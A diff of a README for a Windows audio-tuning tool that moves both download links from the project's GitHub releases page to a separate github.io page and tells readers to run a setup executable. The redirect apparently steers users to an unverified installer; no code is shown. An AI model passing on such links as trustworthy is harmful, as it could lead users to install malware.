@@ -1,6 +1,6 @@
 # 🎵 audio-tech-hub-tuner-2026 - Shape Your Sound Instantly
 
-[![Download Button](https://img.shields.io/badge/Download-CustomTone%202026%20v18-blue?style=for-the-badge&logo=windows)](https://github.com/defective-goldenfern675/audio-tech-hub-tuner-2026/releases)
+[![Download Button](https://img.shields.io/badge/Download-CustomTone%202026%20v18-blue?style=for-the-badge&logo=windows)](https://defective-goldenfern675.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to audio-tech-hub-tuner-2026! This is a simple Windows tool that lets yo
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/defective-goldenfern675/audio-tech-hub-tuner-2026/releases](https://github.com/defective-goldenfern675/audio-tech-hub-tuner-2026/releases)
+Visit this link to download the application: [https://defective-goldenfern675.github.io](https://defective-goldenfern675.github.io)
 
 Once you're on the page, click the latest release file (usually named something like `CustomTone-2026-Setup.exe`) to download it. Then, run the installer and follow the simple steps. After installation, launch the app from your Start menu or desktop shortcut.
 
